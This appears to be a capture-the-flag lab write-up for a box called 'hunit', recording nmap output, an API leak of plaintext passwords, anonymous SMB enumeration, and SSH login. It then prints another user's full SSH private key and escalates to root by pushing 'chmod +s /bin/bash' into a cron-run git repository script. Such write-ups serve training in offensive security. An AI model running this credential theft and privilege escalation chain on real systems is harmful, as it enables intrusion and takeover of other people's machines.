# Export

```md
export IP="192.168.113.125"
export URL="http://192.168.113.125:80/FUZZ"
export LIP="192.168.49.113"
```


<hr>

# Nmap
```bash
RT      STATE SERVICE     REASON         VERSION
8080/tcp  open  http-proxy  syn-ack ttl 63
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Sat, 24 Jul 2021 02:15:47 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sat, 24 Jul 2021 02:15:48 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Sat, 24 Jul 2021 02:15:48 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: My Haikus
12445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18030/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.46 ((Unix))
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)

```


<hr>

# Web Application

### Port 8080:

+ Potential users: `james`, `julie`, `jennifer`, `richard`
+ `/api` directory:

```md
view-source:http://192.168.113.125:8080/article/in-a-station-of-the-metro

<!--
<a href="http://localhost:8080/api/">List all</a>
-->
```

+ Hidden directory reveals password.
 
 ```md
 http://192.168.113.125:8080/api/user/*
 
 [{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},
 {"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},
 {"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},
 {"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},
 {"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]
 ```


<hr>

# SMB Service
### Port 12445:
+ Allow anonymous login.
+ List files share.
```bash
$ smbclient -L $IP -p 12445
Enter WORKGROUP\jaenguyen's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        Commander       Disk      Dademola Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
SMB1 disabled -- no workgroup available
```

+ Allow write permission for anonymous user? YES 

+ Valid users:
```bash
$ rpcclient -p 12445 -U "" $IP -N

rpcclient $> netshareenumall
netname: Commander
        remark: Dademola Files
        path:   C:\home\dademola\shared
        password:
netname: IPC$
        remark: IPC Service (Samba 4.13.2)
        path:   C:\tmp
        password:
```


<hr>

# SSH 
### Port 43022

+ Valid Credentials:  `dademola:ExplainSlowQuest110`

<hr>

# Local Enumeration
+ Is there another user on the system? YES

```bash
[dademola@hunit shm]$ cat /etc/passwd | grep sh
root:x:0:0::/root:/bin/bash
dademola:x:1001:1001::/home/dademola:/bin/bash
git:x:1005:1005::/home/git:/usr/bin/git-shell
```

+ `/home/git` SSH private key.
```bash
[dademola@hunit shm]$ cat /home/git/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
```


+ crontab
```bash
[dademola@hunit shm]$ cat /etc/crontab.bak 
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```


+ pspy64 detects that the user root will pull the `git-server` repository everything 2 minutes and then exectue `backups.sh` script.
```bash
2021/07/24 07:12:01 CMD: UID=0    PID=22836  | /bin/bash /root/pull.sh 
2021/07/24 07:12:01 CMD: UID=0    PID=22835  |                                                           
2021/07/24 07:12:01 CMD: UID=0    PID=22838  | /usr/lib/git-core/git fetch --update-head-ok 
2021/07/24 07:12:01 CMD: UID=0    PID=22839  | /bin/sh -c git-upload-pack '/git-server' git-upload-pack '/git-server' 
2021/07/24 07:12:01 CMD: UID=0    PID=22840  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2021/07/24 07:12:01 CMD: UID=0    PID=22841  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2021/07/24 07:12:01 CMD: UID=0    PID=22842  | /usr/lib/git-core/git maintenance run --auto --no-quiet 
2021/07/24 07:12:01 CMD: UID=0    PID=22843  | /usr/lib/git-core/git merge FETCH_HEAD 
2021/07/24 07:14:01 CMD: UID=0    PID=22848  | /usr/bin/crond -n      
2021/07/24 07:14:01 CMD: UID=0    PID=22849  | /bin/sh -c /root/pull.sh 
2021/07/24 07:14:01 CMD: UID=0    PID=22850  | git pull               
2021/07/24 07:14:01 CMD: UID=0    PID=22851  | /usr/lib/git-core/git fetch --update-head-ok 
2021/07/24 07:14:01 CMD: UID=0    PID=22852  | /bin/sh -c git-upload-pack '/git-server' git-upload-pack '/git-server' 
2021/07/24 07:14:01 CMD: UID=0    PID=22853  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2021/07/24 07:14:01 CMD: UID=0    PID=22854  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2021/07/24 07:14:01 CMD: UID=???  PID=22855  | ???
2021/07/24 07:14:01 CMD: UID=0    PID=22856  | /usr/lib/git-core/git merge FETCH_HEAD                                                                                                                                 
2021/07/24 07:15:01 CMD: UID=0    PID=22859  | /usr/bin/crond -n                                                                                                  
```

+ Can we clone the `git-server` repository using `git` user SSH key? YES

```bash
$ GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git clone git@192.168.113.125:/git-server 

Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

+ Can we push the `git-server` repository using `git` user SSH key? YES

```bash
$ cd git-server; echo "chmod +s /bin/bash" >> backups.sh
$ chmod +x backups.sh
$ git add .
$ git commit -m "Update backups.ssh" backups.sh
$ GIT_SSH_COMMAND='ssh -i git_rsa -p 43022' git push origin master

Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (2/2), 235 bytes | 235.00 KiB/s, done.
Total 2 (delta 1), reused 0 (delta 0), pack-reused 0 
To 192.168.113.125:/git-server
   b54f31f..588e52f  master -> master
```


+ Wait for connection and obtain root shell!.
